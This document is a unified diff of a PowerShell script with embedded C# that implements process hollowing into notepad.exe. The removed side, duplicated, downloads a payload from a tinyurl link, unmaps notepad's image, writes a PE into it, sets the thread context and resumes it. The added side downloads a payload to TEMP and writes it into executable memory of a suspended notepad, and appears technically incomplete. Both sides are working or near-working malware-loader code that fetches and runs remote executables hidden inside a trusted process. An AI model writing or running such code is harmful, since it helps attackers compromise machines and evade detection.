@@ -2,23 +2,23 @@ Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
-public class Native {
-    [StructLayout(LayoutKind.Sequential)]
+public class Win32 {
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public struct STARTUPINFO {
-        public int cb;
-        public IntPtr lpReserved;
-        public IntPtr lpDesktop;
-        public IntPtr lpTitle;
-        public int dwX;
-        public int dwY;
-        public int dwXSize;
-        public int dwYSize;
-        public int dwXCountChars;
-        public int dwYCountChars;
-        public int dwFillAttribute;
-        public int dwFlags;
-        public short wShowWindow;
-        public short cbReserved2;
+        public Int32 cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
@@ -29,55 +29,11 @@ public class Native {
     public struct PROCESS_INFORMATION {
         public IntPtr hProcess;
         public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
+        public Int32 dwProcessId;
+        public Int32 dwThreadId;
     }
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct CONTEXT64 {
-        public ulong P1Home;
-        public ulong P2Home;
-        public ulong P3Home;
-        public ulong P4Home;
-        public ulong P5Home;
-        public ulong P6Home;
-        public uint ContextFlags;
-        public uint MxCsr;
-        public ushort SegCs;
-        public ushort SegDs;
-        public ushort SegEs;
-        public ushort SegFs;
-        public ushort SegGs;
-        public ushort SegSs;
-        public uint EFlags;
-        public ulong Dr0;
-        public ulong Dr1;
-        public ulong Dr2;
-        public ulong Dr3;
-        public ulong Dr6;
-        public ulong Dr7;
-        public ulong Rax;
-        public ulong Rcx;
-        public ulong Rdx;
-        public ulong Rbx;
-        public ulong Rsp;
-        public ulong Rbp;
-        public ulong Rsi;
-        public ulong Rdi;
-        public ulong R8;
-        public ulong R9;
-        public ulong R10;
-        public ulong R11;
-        public ulong R12;
-        public ulong R13;
-        public ulong R14;
-        public ulong R15;
-        public ulong Rip;
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
-        public byte[] DummyBytes;
-    }
-
-    [DllImport("kernel32.dll", SetLastError=true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CreateProcess(
         string lpApplicationName,
         string lpCommandLine,
@@ -91,25 +47,7 @@ public class Native {
         out PROCESS_INFORMATION lpProcessInformation
     );
 
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(
-        IntPtr hProcess,
-        IntPtr lpBaseAddress,
-        byte[] lpBuffer,
-        int dwSize,
-        out IntPtr lpNumberOfBytesRead
-    );
-
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(
-        IntPtr hProcess,
-        IntPtr lpBaseAddress,
-        byte[] lpBuffer,
-        int dwSize,
-        out IntPtr lpNumberOfBytesWritten
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(
         IntPtr hProcess,
         IntPtr lpAddress,
@@ -118,358 +56,88 @@ public class Native {
         uint flProtect
     );
 
-    [DllImport("ntdll.dll", SetLastError=true)]
-    public static extern uint NtUnmapViewOfSection(
-        IntPtr hProcess,
-        IntPtr baseAddress
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool GetThreadContext(
-        IntPtr hThread,
-        ref CONTEXT64 lpContext
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool SetThreadContext(
-        IntPtr hThread,
-        ref CONTEXT64 lpContext
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern uint ResumeThread(
-        IntPtr hThread
-    );
-}
-"@ -Language CSharp
-
-function Get-Payload {
-    param([string]$url)
-    return (Invoke-WebRequest $url -UseBasicParsing).Content
-}
-
-function Convert-HexToBytes {
-    param([string]$hex)
-    $bytes = New-Object byte[] ($hex.Length / 2)
-    for ($i = 0; $i -lt $bytes.Length; $i++) {
-        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
-    }
-    return $bytes
-}
-
-# CONFIG
-$exeUrl = "https://tinyurl.com/mwr259jv"
-
-Write-Host "[*] Downloading 64-bit payload..."
-$payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
-$pe = $payloadBytes.Content
-$peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)
-
-Write-Host "[*] Waiting for F10 to inject..."
-while ($true) {
-    Start-Sleep -Milliseconds 100
-    # Replace IsKeyLocked with GetAsyncKeyState or other reliable method if needed
-    # Here a simple workaround:
-    $keyState = [console]::KeyAvailable
-    if ($keyState) {
-        $key = [console]::ReadKey($true)
-        if ($key.VirtualKeyCode -eq 121) {  # F10 keycode is 121 decimal
-            break
-        }
-    }
-}
-
-$si = New-Object Native+STARTUPINFO
-$pi = New-Object Native+PROCESS_INFORMATION
-$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
-
-Write-Host "[*] Launching notepad suspended..."
-$result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
-if (!$result) { Write-Error "[-] Failed to create process"; exit }
-
-# Get base address
-$ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = (0x100000 -bor 0x1F)  # <-- Fixed bitwise OR with -bor inside parentheses
-[Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
-
-# Read base image address
-$buffer = New-Object byte[] 8
-[IntPtr]$bytesRead = [IntPtr]::Zero
-[Native]::ReadProcessMemory($pi.hProcess, [IntPtr]($ctx.Rdx + 0x10), $buffer, 8, [ref]$bytesRead)
-$imageBase = [BitConverter]::ToUInt64($buffer, 0)
-
-# Unmap
-[Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null
-
-# Parse new image size and entry
-$newImageBase = $imageBase
-$payloadSize = $peBytes.Length
-$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)  # e_lfanew + 0x28 (AddressOfEntryPoint)
-$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54) # SizeOfHeaders
-$sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)
-
-# Allocate memory
-$remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$newImageBase, $sizeOfImage, 0x3000, 0x40)
-
-# Write headers
-[Native]::WriteProcessMemory($pi.hProcess, [IntPtr]$remoteBase, $peBytes, $headersSize, [ref]$null) | Out-Null
-
-# Write each section
-$numberOfSections = [BitConverter]::ToUInt16($peBytes, 0x6)
-$sectionOffset = 0xF8
-for ($i = 0; $i -lt $numberOfSections; $i++) {
-    $virtualAddr = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x0C)
-    $rawSize = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x10)
-    $rawOffset = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x14)
-    $sectionData = $peBytes[$rawOffset..($rawOffset + $rawSize - 1)]
-    [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]($remoteBase.ToInt64() + $virtualAddr), $sectionData, $rawSize, [ref]$null) | Out-Null
-    $sectionOffset += 0x28
-}
-
-# Set RIP to new entry point
-$ctx.Rcx = [UInt64]($remoteBase.ToInt64() + $entryRVA)
-$ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
-[Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
-
-# Resume
-[Native]::ResumeThread($pi.hThread) | Out-Null
-
-Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Native {
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO {
-        public int cb;
-        public IntPtr lpReserved;
-        public IntPtr lpDesktop;
-        public IntPtr lpTitle;
-        public int dwX;
-        public int dwY;
-        public int dwXSize;
-        public int dwYSize;
-        public int dwXCountChars;
-        public int dwYCountChars;
-        public int dwFillAttribute;
-        public int dwFlags;
-        public short wShowWindow;
-        public short cbReserved2;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdError;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct CONTEXT64 {
-        public ulong P1Home;
-        public ulong P2Home;
-        public ulong P3Home;
-        public ulong P4Home;
-        public ulong P5Home;
-        public ulong P6Home;
-        public uint ContextFlags;
-        public uint MxCsr;
-        public ushort SegCs;
-        public ushort SegDs;
-        public ushort SegEs;
-        public ushort SegFs;
-        public ushort SegGs;
-        public ushort SegSs;
-        public uint EFlags;
-        public ulong Dr0;
-        public ulong Dr1;
-        public ulong Dr2;
-        public ulong Dr3;
-        public ulong Dr6;
-        public ulong Dr7;
-        public ulong Rax;
-        public ulong Rcx;
-        public ulong Rdx;
-        public ulong Rbx;
-        public ulong Rsp;
-        public ulong Rbp;
-        public ulong Rsi;
-        public ulong Rdi;
-        public ulong R8;
-        public ulong R9;
-        public ulong R10;
-        public ulong R11;
-        public ulong R12;
-        public ulong R13;
-        public ulong R14;
-        public ulong R15;
-        public ulong Rip;
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
-        public byte[] DummyBytes;
-    }
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool CreateProcess(
-        string lpApplicationName,
-        string lpCommandLine,
-        IntPtr lpProcessAttributes,
-        IntPtr lpThreadAttributes,
-        bool bInheritHandles,
-        uint dwCreationFlags,
-        IntPtr lpEnvironment,
-        string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo,
-        out PROCESS_INFORMATION lpProcessInformation
-    );
-
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(
-        IntPtr hProcess,
-        IntPtr lpBaseAddress,
-        byte[] lpBuffer,
-        int dwSize,
-        out IntPtr lpNumberOfBytesRead
-    );
-
-    [DllImport("kernel32.dll")]
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(
         IntPtr hProcess,
         IntPtr lpBaseAddress,
         byte[] lpBuffer,
-        int dwSize,
-        out IntPtr lpNumberOfBytesWritten
+        uint nSize,
+        out UIntPtr lpNumberOfBytesWritten
     );
 
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAllocEx(
-        IntPtr hProcess,
-        IntPtr lpAddress,
-        uint dwSize,
-        uint flAllocationType,
-        uint flProtect
-    );
-
-    [DllImport("ntdll.dll", SetLastError=true)]
-    public static extern uint NtUnmapViewOfSection(
-        IntPtr hProcess,
-        IntPtr baseAddress
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool GetThreadContext(
-        IntPtr hThread,
-        ref CONTEXT64 lpContext
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool SetThreadContext(
-        IntPtr hThread,
-        ref CONTEXT64 lpContext
-    );
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern uint ResumeThread(
-        IntPtr hThread
-    );
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint ResumeThread(IntPtr hThread);
 }
-"@ -Language CSharp
+"@ -PassThru
 
-function Get-Payload {
-    param([string]$url)
-    return (Invoke-WebRequest $url -UseBasicParsing).Content
+# Replace this with your direct link to the payload .exe
+$payloadUrl = "https://example.com/payload.exe"
+$tempPath = "$env:TEMP\payload.exe"
+
+try {
+    Invoke-WebRequest -Uri $payloadUrl -OutFile $tempPath -UseBasicParsing
+} catch {
+    Write-Host "[!] Failed to download payload."
+    exit
 }
 
-function Convert-HexToBytes {
-    param([string]$hex)
-    $bytes = New-Object byte[] ($hex.Length / 2)
-    for ($i = 0; $i -lt $bytes.Length; $i++) {
-        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
-    }
-    return $bytes
-}
+# Read the payload
+$payloadBytes = [System.IO.File]::ReadAllBytes($tempPath)
 
-# CONFIG
-$exeUrl = "https://tinyurl.com/mwr259jv"
-
-Write-Host "[*] Downloading 64-bit payload..."
-$payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
-$pe = $payloadBytes.Content
-$peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)
-
-Write-Host "[*] Waiting for F10 to inject..."
-while ($true) {
-    Start-Sleep -Milliseconds 100
-    # Replace IsKeyLocked with GetAsyncKeyState or other reliable method if needed
-    # Here a simple workaround:
-    $keyState = [console]::KeyAvailable
-    if ($keyState) {
-        $key = [console]::ReadKey($true)
-        if ($key.VirtualKeyCode -eq 121) {  # F10 keycode is 121 decimal
-            break
-        }
-    }
-}
-
-$si = New-Object Native+STARTUPINFO
-$pi = New-Object Native+PROCESS_INFORMATION
+# Setup STARTUPINFO and PROCESS_INFORMATION
+$si = New-Object Win32+STARTUPINFO
+$pi = New-Object Win32+PROCESS_INFORMATION
 $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
 
-Write-Host "[*] Launching notepad suspended..."
-$result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
-if (!$result) { Write-Error "[-] Failed to create process"; exit }
+# Start notepad in suspended mode
+$success = [Win32]::CreateProcess(
+    "C:\Windows\System32\notepad.exe",
+    $null,
+    [IntPtr]::Zero,
+    [IntPtr]::Zero,
+    $false,
+    0x4, # CREATE_SUSPENDED
+    [IntPtr]::Zero,
+    $null,
+    [ref]$si,
+    [ref]$pi
+)
 
-# Get base address
-$ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = 0x100000 -bor 0x1F
-
-[Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
-
-# Read base image address
-$buffer = New-Object byte[] 8
-[IntPtr]$bytesRead = [IntPtr]::Zero
-[Native]::ReadProcessMemory($pi.hProcess, [IntPtr]($ctx.Rdx + 0x10), $buffer, 8, [ref]$bytesRead)
-$imageBase = [BitConverter]::ToUInt64($buffer, 0)
-
-# Unmap
-[Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null
-
-# Parse new image size and entry
-$newImageBase = $imageBase
-$payloadSize = $peBytes.Length
-$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)  # e_lfanew + 0x28 (AddressOfEntryPoint)
-$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54) # SizeOfHeaders
-$sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)
-
-# Allocate memory
-$remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$newImageBase, $sizeOfImage, 0x3000, 0x40)
-
-# Write headers
-[Native]::WriteProcessMemory($pi.hProcess, [IntPtr]$remoteBase, $peBytes, $headersSize, [ref]$null) | Out-Null
-
-# Write each section
-$numberOfSections = [BitConverter]::ToUInt16($peBytes, 0x6)
-$sectionOffset = 0xF8
-for ($i = 0; $i -lt $numberOfSections; $i++) {
-    $virtualAddr = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x0C)
-    $rawSize = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x10)
-    $rawOffset = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x14)
-    $sectionData = $peBytes[$rawOffset..($rawOffset + $rawSize - 1)]
-    [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]($remoteBase.ToInt64() + $virtualAddr), $sectionData, $rawSize, [ref]$null) | Out-Null
-    $sectionOffset += 0x28
+if (-not $success) {
+    Write-Host "[!] Failed to create suspended process."
+    exit
 }
 
-# Set RIP to new entry point
-$ctx.Rcx = [UInt64]($remoteBase.ToInt64() + $entryRVA)
-$ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
-[Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
+# Allocate memory in target process
+$remoteAddr = [Win32]::VirtualAllocEx(
+    $pi.hProcess,
+    [IntPtr]::Zero,
+    [uint32]$payloadBytes.Length,
+    0x3000, # MEM_COMMIT | MEM_RESERVE
+    0x40    # PAGE_EXECUTE_READWRITE
+)
 
-# Resume
-[Native]::ResumeThread($pi.hThread) | Out-Null
+if ($remoteAddr -eq [IntPtr]::Zero) {
+    Write-Host "[!] Failed to allocate memory."
+    exit
+}
 
-Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
+# Write payload to remote memory
+$bytesWritten = [UIntPtr]::Zero
+$write = [Win32]::WriteProcessMemory(
+    $pi.hProcess,
+    $remoteAddr,
+    $payloadBytes,
+    [uint32]$payloadBytes.Length,
+    [ref]$bytesWritten
+)
+
+if (-not $write) {
+    Write-Host "[!] Failed to write memory."
+    exit
+}
+
+# Resume target process (payload will run if entry point is correct)
+[Win32]::ResumeThread($pi.hThread) | Out-Null
+
+Write-Host "[+] Injection complete. Notepad hollowed with payload."
